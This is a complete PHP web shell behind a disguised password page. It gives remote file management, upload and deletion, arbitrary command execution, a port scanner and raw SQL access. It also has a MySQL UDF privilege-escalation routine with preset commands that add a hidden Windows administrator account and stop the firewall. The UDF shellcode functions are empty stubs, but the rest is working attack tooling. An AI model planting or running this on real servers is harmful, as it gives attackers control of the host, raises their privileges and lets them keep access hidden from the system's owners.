<?php
/**
 * Created by PhpStorm.
 * User: ccl
 * Date: 2018/11/20
 * Time: 19:27
 */
header('Content-type:text/html;charset=utf-8');
$password = 'admin';
//登录函数
function login(){
    print <<<END
<html>
<head>
<meta charset="utf-8">
<title>想念初恋</title>
<style>
   body{text-align: center;}
   .div{
   width:600px;
   height: 200px;
   border:2px solid;
   border-radius:25px;
   background-color: black;
   margin-top: 200px;
   margin-left:auto;
   margin-right:auto;
   }
</style>
</head>
<body>
    <div class="div">
        <form method="post">
            <div style="margin-top:80px">
                <input type="text" name="spiderpass" placeholder="密码"/>
                <input type="submit" value="登录">
            </div>
        </form>
    </div>
</body>
</html>
END;
}

/**
 * cookie判断
 */
if(!isset($_COOKIE['admin_password'])){
    ob_start();
    if(isset($_POST['spiderpass'])){
        if (md5($_POST['spiderpass']) === md5($password)){
            setcookie('admin_password',md5($password),time()+60*60*12);
            die('<meta http-equiv="refresh" content="1;URL=?">');
        }
    }
    login();
    ob_end_flush();
    exit();
}
//主页面函数
function main(){
    $Server_OSs =  php_uname();  //获取操作系统信息
    $Server_Soft = $_SERVER["SERVER_SOFTWARE"];
    print <<<END
<html>
<head>
<style>
 ul li{
list-style-type:none;
margin-top: 18px;
background-color: #E0E0E0;
font-size: 28px;
font-family: 楷体 ;
border-radius: 2px; 
}
a{ text-decoration:none} 
</style>
</head>
<body>
    <div class="outtable" style="background-color: rgba(0,0,0,0.3)">
        <div class="topbg"> <div style="text-align: center;color: #00ff00;font-size: 30px"> {$Server_OSs}  </div>   </div>
            <div style="height:90%;">
                <table width="100%" height="100%" border=0 cellpadding="0" cellspacing="0">
                <tr>
                <td width="220" align="center" valign="top">
                    <ul class="listbg">
                        <li><a href="?s=a" id="t_0" target="main"> 文件管理 </a></li>
                        <li><a href="?s=b" id="t_1" target="main"> 执行命令 </a></li>
                        <!--<li><a href="?s=e" id="t_4" target="main"> 扫描木马 </a></li>-->
                        <li><a href="?s=f" id="t_5" target="main"> 系统信息 </a></li>
                        <li><a href="?s=i" id="t_8" target="main"> 扫描端口 </a></li>
                        <li><a href="?s=m" id="t_12" target="main"> MYSQL提权 </a></li>
                        <li><a href="?s=n" id="t_13" target="main"> MYSQL执行 </a></li>
                        <!--<li><a href="?s=o" id="t_14" target="main"> MYSQL管理 </a></li>-->
                        <li><a href="?s=logout" id="t_15"> 退出系统 </a></li>
                    </ul>
                </td>
                <td>
                <iframe name="main" src="?s=a" width="100%" height="100%" frameborder="0"></iframe>
                </td>
                </tr>
                </table>
            </div>
        <div class="bottombg"> {$Server_Soft} </div>
        </div>
</body>
</html>
END;
}
//文件管理
function management($path){
    $REAL_DIR = realpath($path);
    $UP_DIR = dirname($REAL_DIR);   //取得文件的上级目录
    print <<<END
    <div style="background-color: ;width: 75%;height: 75%;margin-top: 50px;margin-left: 7%">
        <form method="get">
            <input type="hidden" id="s" name="s" value="a">
            <input style="width: 55%;height: 30px;"  type="text" name="p" value="{$path}">
            <input type="submit" value="转到">
        </form>
        <div style="background-color: #FFFFCC;">
            <form method="post" action="?s=upload&p={$path}" enctype="multipart/form-data">
                <label for="file">文件名</label>
                <input type="file" name="file" >
                <input type="submit" value="上传">
            </form>
        </div>
        <div style="width: 100%">
            <table border="1" width="100%" style="font-size:18px;color: white">
                <tr>
                    <td width="20%" align="center"><a href="?s=a&p={$UP_DIR}">上级目录</a></td>
                    <td width="20%" align="center">操作</td>
                    <td width="20%" align="center">文件属性</td>
                    <td width="20%" align="center">修改时间</td>
                    <td width="20%" align="center">文件大小</td>
                </tr>
END;
    if (($dir = @opendir($path)) == null) return false;
    while (false != ($filename = @readdir($dir))){
        if ($filename == '.' || $filename == '..') continue;
        $Filepath = $REAL_DIR.'/'.$filename;
        if (is_dir($Filepath)){
            $Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);
            $Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
            print <<<END
                <tr>
                    <td><a href="?s=a&p={$Filepath}">{$filename}</a></td>
                    <td align="center">
                        <a href="{scwj($Filepath)}">删除</a>
                    </td>
                    <td align="center">{$Fileperm}</td>
                    <td>{$Filetime}</td>
                    <td>{$Filetime}</td>
                </tr>
END;
        }
    }
    @rewinddir($dir);
    while (false != ($filename = @readdir($dir))){
        if ($filename == '.' || $filename == '..') continue;
        $Filepath = $REAL_DIR.'/'.$filename;
        if (!is_dir($Filepath)){
            $Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);
            $Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
            print <<<END
                <tr>
                    <td>{$filename}</td>
                    <td align="center">
                        <a href="?s=downfile&p={$Filepath}">下载</a>
                        <a href="?s=scwj&p={$Filepath}">删除</a>
                    </td>
                    <td align="center">{$Fileperm}</td>
                    <td>{$Filetime}</td>
                    <td>{$Filetime}</td>
                </tr>
  <!--          </table>
        </div>
    </div>-->
END;
        }
    }
}
/**
 * 文件上传
 * @param $path
 */
function uploadfile($path){
    if ($_FILES['file']['error'] > 0){
    }else{
        if (file_exists($path.'/'.$_FILES['file']['name'])){
            echo '文件已经存在';
        }else{
            move_uploaded_file($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name']);
            echo '上传的文件路径：'.$path.'/'.$_FILES['file']['name'];
        }
    }
    management($path);
}
/**
 * 删除文件
 * @param $filename
 */
function scwj($filename){
    unlink($filename);
    $UP_DIR = dirname($filename);
    management($UP_DIR);
}
//下载文件
function downfile($Filepath){
    $UP_DIR = dirname($Filepath);
    $fileName = basename($Filepath);
    //以只读和二进制模式打开文件
    $file = fopen ( $Filepath, "rb" );
    //告诉浏览器这是一个文件流格式的文件
    Header ( "Content-type: application/octet-stream" );
    //请求范围的度量单位
    Header ( "Accept-Ranges: bytes" );
    //Content-Length是指定包含于请求或响应中数据的字节长度
    Header ( "Accept-Length: " . filesize ( $Filepath ) );
    //用来告诉浏览器，文件是可以当做附件被下载，下载后的文件名称为$file_name该变量的值。
    Header ( "Content-Disposition: attachment; filename=" . $fileName );
    //读取文件内容并直接输出到浏览器
    echo fread ( $file, filesize ( $Filepath ) );
    fclose($file);
//    exit();
    management($UP_DIR);
}
//执行命令
function Excuting(){
    $cmd = "dir";
    if(!empty($_POST['cmd'])){$cmd = $_POST['cmd'];}
    $res = Exec_Run($cmd);
	$encode = mb_detect_encoding($res, array("ASCII",'UTF-8',"GB2312","GBK",'BIG5')); 
	$res = mb_convert_encoding($res, 'UTF-8', $encode);
    print <<<END
    <form method="POST" name="gform" id="gform" action="?s=b"><center><div class="actall">
        命令参数 <input type="text" name="cmd" id="cmd" value="{$cmd}" style="width:399px;">
        <input type="submit" value="执行" style="width:80px;"></div>
        <div class="actall"><textarea name="show" style="width:990px;height:500px;">{$res}</textarea></div></center>
    </form>
END;
}
//运行cmd 命令
function Exec_Run($cmd)
{
    $res = '';
    if(function_exists('exec')){@exec($cmd,$res);$res = join("\n",$res);}
    elseif(function_exists('shell_exec')){$res = @shell_exec($cmd);}
    elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}
    elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}
    elseif(@is_resource($f = @popen($cmd,"r"))){$res = '';while(!@feof($f)){$res .= @fread($f,1024);}@pclose($f);}
    return $res;
}
/**
 * 系统信息
 */
function systeminfo(){
	$cmd = "systeminfo";
	$res = '';
    if(function_exists('exec')){@exec($cmd,$res);$res = join("\n",$res);}
    elseif(function_exists('shell_exec')){$res = @shell_exec($cmd);}
    elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}
    elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}
    elseif(@is_resource($f = @popen($cmd,"r"))){$res = '';while(!@feof($f)){$res .= @fread($f,1024);}@pclose($f);}
	$encode = mb_detect_encoding($res, array("ASCII",'UTF-8',"GB2312","GBK",'BIG5')); 
	$res = mb_convert_encoding($res, 'UTF-8', $encode);
	print <<<END
        <div style="background-color:;width: 100%;height: 98%">
            <textarea style="width: 98%;height: 100%;">{$res}</textarea>
        </div>
</div>
END;
}
function useradd(){

}
/**
 * 端口扫描
 */
function  scanPort(){
    $ip = getenv('REMOTE_ADDR'); //获取本机ip
    if (empty($_POST['ports'])){
        $ports = array(80,3389);
    }else{
        $ports = explode(',',str_replace(" ", "", $a=str_replace("，",",",$_POST['ports'])));
        $ports = array_unique($ports);
    }
    $list = [];
    $strPosts = '';
    foreach ($ports as $port){
        $fp = @fsockopen($ip,$port,$errno,$errstr,30);
        if ($fp){
			

            $list['open'][] = $port;
        }else{
            if (!empty($port)){
                $list['close'][] = $port;
            }
        }
        $strPosts .= $port.',';
    }
    $strPosts = substr($strPosts,0,strlen($strPosts)-1);
//    return $list;
    print <<<END
    <div style="background-color:;width: 75%;height: 75%;margin-top: 50px;margin-left: 7%">
        <form method="post" action="?s=i">
            <textarea name="ports" style="width: 100%;height: 100px;">{$strPosts}</textarea>
            <input style="background-color:#FFFFCC;width: 100%;height: 5%;font-size: 25px;font-family: 楷体" type="submit" value="扫描">
        </form>
        <div style="background-color:black;width: 100%;height: 80%">
            <table border="0" width="100%" style="font-size:18px;color: white">
                <tr>
                    <td align="center">端口</td>
                    <td align="center">状态</td>
                </tr>

END;
    if (!empty($list['open'])){
        foreach ($list['open'] as $value){
            print <<<END
            <tr>
                <td align="center">{$value}</td>
                <td style="color: lime" align="center">open</td>
            </tr>
END;
        }
    }
    if (!empty($list['close'])){
        foreach ($list['close'] as $value){
            print <<<END
            <tr>
                <td align="center">{$value}</td>
                <td style="color: red" align="center">close</td>
            </tr>
END;
        }
    }
print <<<END
</table>
</div>
</div>
END;
}
/**
 * mysql 执行
 */
function myzx(){
    $mm = empty($_POST['passwd']) ? null : $_POST['passwd'];
    $host = empty($_POST['host']) ? null : $_POST['host'];
    $name = empty($_POST['name']) ? null : $_POST['name'];
    $passwd = empty($_POST['passwd']) ? null : $_POST['passwd'];
    $dbname = empty($_POST['dbname']) ? null : $_POST['dbname'];
    $sql = empty($_POST['sql']) ? null : $_POST['sql'];
    print <<<END
    <div style="background-color:;width: 75%;height: 75%;margin-top: 50px;margin-left: 7%">
        <form method="post" action="?s=n">
            地址：<input type="text" name="host" value="127.0.0.1">&nbsp;&nbsp;&nbsp;&nbsp;
            数据库：<input type="text" name="name" value="root">&nbsp;&nbsp;&nbsp;&nbsp;
            密码：<input type="text" name="passwd" value="{$mm}">&nbsp;&nbsp;&nbsp;&nbsp;
            数据表：<input type="text" name="dbname" value="{$dbname}">&nbsp;&nbsp;&nbsp;&nbsp;<br>
            sql语句：<textarea style="width: 92%;height: 5%;" name="sql">{$sql}</textarea>
            <input style="background-color:#FFFFCC;width: 98%;height: 5%;font-size: 25px;font-family: 楷体" type="submit" value="执行">
        </form>
END;
    $conn = @mysqli_connect($host,$name,$passwd,$dbname);
    $info = '';
    if (!$conn){
        die("连接失败: " . mysqli_connect_error());
    }else{
        $info = '连接成功!!!';
    }
    if (!empty($sql)){
        $result = @mysqli_query($conn,$sql);
        if (@mysqli_num_rows($result) > 0){
            $info = '';
            while ($row = mysqli_fetch_assoc($result)){
                foreach ($row as $key=>$value){
                    $info .= $key.'--->'.$value.'    ';
                }
                $info .="";
//            $info = print_r($row);
            }
        }else{
            $info = '查询失败';
        }
    }
    print <<<END
        <div style="background-color:;width: 100%;height: 80%">
            <textarea style="width: 98%;height: 100%;">{$info}</textarea>
        </div>
</div>
END;
}
/**
 * mysql 提权
 */
function udfmysql(){
    $host = '127.0.0.1';
    $name = empty($_POST['name']) ? null : $_POST['name'];
    $passwd = empty($_POST['passwd']) ? null : $_POST['passwd'];
    $mysql = empty($_POST['mysql']) ? null : $_POST['mysql'];
    $dbname = 'mysql';
    $version = '';
    $path = '';
    $bz = '';
    $osVersion = '';
    $shellcode = '';
    print <<<END
    <div style="background-color:;width: 75%;height: 75%;margin-top: 50px;margin-left: 7%">
        <form method="post" action="?s=m">
            用户名：<input type="text" name="name" value="{$name}">&nbsp;&nbsp;&nbsp;&nbsp;
            密码：<input type="text" name="passwd" value="{$passwd}">&nbsp;&nbsp;&nbsp;&nbsp;
            <input style="background-color:#E0E0E0;width: 98%;height: 5%;font-size: 25px;font-family: 楷体" type="submit" value="一键提权">
        </form>
END;
    $conn = @mysqli_connect($host,$name,$passwd,$dbname);
    if (!$conn){
        die("连接失败: " . mysqli_connect_error());
    }else{
        $sql = "select 1 as bz from mysql.func where name='sys_eval'";
        $result = @mysqli_query($conn,$sql);
        if (@mysqli_num_rows($result) > 0) {
            if($row = mysqli_fetch_assoc($result)) {
                $bz = $row['bz'];
            }
        }
        $sql = "select substr(@@version,1,3) as version,@@basedir as path,@@version_compile_os as osVersion";
        $result = @mysqli_query($conn,$sql);
        if (@mysqli_num_rows($result) > 0) {
            if($row = mysqli_fetch_assoc($result)) {
                $version = $row['version'];
                $path = $row['path'];
                $osVersion = $row['osVersion'];
            }
        }
    }
    if ($bz != 1){
        if ($version>5.2){
            if (!is_file($path.'lib'.'\plugin\\moonudf.dll')){
                $path = str_replace('/','\\',$path);
                if(!is_dir($path.'lib')){
                    Exec_Run('mkdir '.$path.'lib');
                }
                if(!is_dir($path.'lib'.'\plugin')){
                    Exec_Run('mkdir '.$path.'lib'.'\plugin');
                }
                $path = $path.'lib'.'\plugin';
                if ($osVersion='Win32'){
                    $shellcode = mysql86();
                }else{
                    $shellcode = mysql64();
                }
                importUDF($conn,$shellcode,$path);
                $query=mysqli_query($conn,"create function sys_eval returns string soname 'moonudf.dll';");
                if(!$query){
                    echo '创建sys_eval函数失败'.mysqli_error($conn);
                }else{
                    echo '创建成功';
                }
            }else{
                echo "已经创建";
            }
        }else{
            if (!is_file('c:\windows\system32\moonudf.dll')){
                $path = "c:\windows\system32";
                if ($osVersion='Win32'){
                    $shellcode = mysql86();
                }else{
                    $shellcode = mysql64();
                }
                importUDF($conn,$shellcode,$path);
                $query=mysqli_query($conn,"create function sys_eval returns string soname 'moonudf.dll';");
                if(!$query){
                    echo '创建sys_eval函数失败'.mysqli_error($conn);
                }else{
                    echo '创建成功';
                }
            }else{
                echo "已经创建";
            }
        }
    }else{
        echo '已经创建';
    }
    print <<<END
    <div style="background-color:;width: 98%;height: 75%;margin-top: 50px;">
        <hr>
        自带命令:<br>
        <form method="post" action="?s=m">
            <input type="hidden" name="name" value="{$name}">
            <input type="hidden" name="passwd" value="{$passwd}">
            <select name="mysql">
                <option value="select sys_eval('net user moon$ 123456 /add & net localgroup administrators moon$ /add')">添加超级管理员</option>
                <option value="select sys_eval('net user')">查看用户</option>
                <option value="select sys_eval('netstat -an')">查看端口</option>
                <option value="select sys_eval('net stop sharedacess')">停止防火墙</option>
                <option value="select name from mysql.func">查看创建函数</option>
                <option value="delete from mysql.func where name='sys_eval'">删除sys_eval</option>
            </select>
        &nbsp<input type="submit" value="提交" />
        </form>

        <form action="?s=m" method="post">
        <input type="hidden" name="name" value="{$name}">
        <input type="hidden" name="passwd" value="{$passwd}">
        自定义SQL语句:<br>
        <textarea name="mysql" cols="90" rows="3">{$mysql}</textarea>
        &nbsp<input type="submit" value="执行" />
        </form>
        回显结果:<br>
        <textarea cols="90" rows="10" id="contactus" name="contactus">
        SQL语句:{$mysql} <br>
END;
    if ($mysql != ""){
        $result = @mysqli_query($conn,$mysql);
        if (@mysqli_num_rows($result) > 0) {
            while($rows = mysqli_fetch_assoc($result)) {
                foreach($rows as $value){
                    echo iconv("UTF-8", "GB2312//IGNORE",  $value);
                }
            }
        }
    }
    print <<<END
        </textarea>
END;

}
function importUDF($conn,$shellcode,$path){
    $path = str_replace('\\','\\\\',$path)."\\\\moonudf.dll";
    mysqli_query($conn,'DROP TABLE Temp_udf');
    $query=mysqli_query($conn,'CREATE TABLE Temp_udf(udf BLOB);');
    if(!$query){
        echo '创建临时表Temp_udf失败请查看失败内容'.mysqli_error($conn);
    }else {
        $query = "INSERT into Temp_udf values (CONVERT($shellcode,CHAR));";
        if (!mysqli_query($conn,$query)) {
            echo 'udf插入失败请查看失败内容' . mysqli_error($conn);
        } else {
            $query = "SELECT udf FROM Temp_udf INTO DUMPFILE '" . $path . "';";
            if (!mysqli_query($conn,$query)) {
                echo 'udf导出失败请查看失败内容' . mysqli_error($conn);
            } else {
                mysqli_query($conn,'DROP TABLE Temp_udf');
                echo '导出成功';
            }
        }
    }
}
function mysql86(){
    return "";
}
function mysql64(){
    return "";
}
/**
 * 退出
 */
function tc(){
    setcookie('admin_password','',time()-1);
    login();
}
if(isset($_GET['s'])){
    $flag = $_GET['s'];
}else{
    $flag = "my";
}
$p = isset($_GET['p']) ? $_GET['p'] : dirname(__FILE__);
switch ($flag){
    case 'a':management($p);break;
    case 'b':Excuting();break;
    case 'c':management();break;
    case 'd':management();break;
    case 'e':management();break;
    case 'f':systeminfo();break;
    case 'g':useradd();break;
    case 'h':management();break;
    case 'i':scanPort();break;
    case 'm':udfmysql();break;
    case 'n':myzx();break;
    case 'scwj':scwj($p);break;  //删除文件
    case 'upload':uploadfile($p);break;  //上传文件
    case 'downfile':downfile($p);break;  //下载文件
    case 'logout':tc();break;  //退出系统
    default:main();break;
}
?>